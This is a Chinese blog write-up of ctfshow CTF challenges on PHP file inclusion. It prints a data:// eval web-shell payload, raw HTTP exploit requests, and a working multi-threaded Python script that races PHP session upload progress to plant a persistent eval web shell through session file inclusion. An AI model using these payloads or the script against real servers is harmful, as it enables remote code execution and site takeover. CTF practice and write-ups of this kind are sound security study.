+++
title = "ctfshow36D练手赛"
slug = "ctfshow-36d-practice-match"
description = "刷"
date = "2024-12-11T19:51:33"
lastmod = "2024-12-11T19:51:33"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["RaceCondition"]
+++

之前做了一个第二个做不出来，现在看了一下很简单的一个题目嘛

## 不知所措.jpg

进来发现这个东西怎么都会进行拼接，是GET参数

```
https://5c3c22f3-7a3b-4d44-8a4c-282e78913487.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=test/../index.
```

```php
<?php
error_reporting(0);
$file=$_GET['file'];
$file=$file.'php';
echo $file."<br />";
if(preg_match('/test/is',$file)){
	include ($file);
}else{
	echo '$file must has test';
}
?>
```

想直接包含根目录的flag但是好像不叫flag.php

那么这里可以试着data来写一下马，直接base64还不好说，还不如不用

```
https://5c3c22f3-7a3b-4d44-8a4c-282e78913487.challenge.ctf.show/?file=data://text/plain,<?=eval($_GET[a]);?>test&a=phpinfo();
```

## easyshell

```
<!--md5($secret.$name)===$pass -->
```

```http
GET /?name=wi&pass=7d00249b47947e33ddae906c7fd90fe6 HTTP/1.1
Host: 6ae1b607-ad8f-490e-a5fa-90e857780a3d.challenge.ctf.show
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: Hash=7d00249b47947e33ddae906c7fd90fe6
referer: https://6ae1b607-ad8f-490e-a5fa-90e857780a3d.challenge.ctf.show/


```

但是我抓包用yakit居然没有抓到这个cookie后面F12才看到的，得到`flflflflag.php`浏览器还不能直接访问，就是看到能包含file参数

```html
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>yesec want Girl friend</title>
</head>
<>
<body>
include($_GET["file"])</body>
</html>
```

```php
//index.php
<?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
	echo '<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
	</script>
';
}else{
	setcookie("Hash",md5($secret.$name),time()+3600000);
	echo "username/password error";
}
?>
<html>
<!--md5($secret.$name)===$pass -->
</html>
```

```php
//config.php
<?php
$secret='%^$&$#fffd';
?>
```

```php
//flflflflag.php
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>yesec want Girl friend</title>
</head>
<>
<body>
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
</body>
</html>
```

什么也没看到，利用session文件包含来打，因为版本我看了是7.0.33，可以利用只要上传了就会生成文件

想利用二次编码直接用inputRCE的，结果没有成功

```http
POST /flflflflag.php?file=php://%69%6e%70%75%74 HTTP/1.1
Host: 6ae1b607-ad8f-490e-a5fa-90e857780a3d.challenge.ctf.show
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: Hash=7d00249b47947e33ddae906c7fd90fe6;PHPSESSID=123
referer: https://6ae1b607-ad8f-490e-a5fa-90e857780a3d.challenge.ctf.show/
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

<?php+system("ls");?>
```

只能打session，经过尝试发现不能直接打命令，写马还是(版本有点低，有些写法还不支持)

```python
import io
import requests
import threading

sessid="baozongwi"
url="http://29c313b2-6969-475a-86ea-fa31e9b98fb7.challenge.ctf.show/flflflflag.php"

def write(session):
    while event.is_set():
        f=io.BytesIO(b'a'*1024*50)
        r=session.post(
            url=url,
            cookies={'PHPSESSID':sessid},
            data={
                # "PHP_SESSION_UPLOAD_PROGRESS": "<?php system('whoami');?>"
                "PHP_SESSION_UPLOAD_PROGRESS":"<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1]);?>');?>"
            },
            files={"file":('wi.txt',f)}
        )

def read(session):
    while event.is_set():
        payload="?file=/tmp/sess_"+sessid
        r=session.get(url=url+payload)

        if 'wi.txt' in r.text:
            print(r.text)
            event.clear()
        else :
            print("nonono")


if __name__=='__main__':
    event=threading.Event()
    event.set()

    with requests.session() as sess:
        for i in range(1,30):
            threading.Thread(target=write,args=(sess,)).start()

        for i in range(1,30):
            threading.Thread(target=read,args=(sess,)).start()
```

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir
```

原来有很多disablefunction这个我们用插件绕过一下就行了

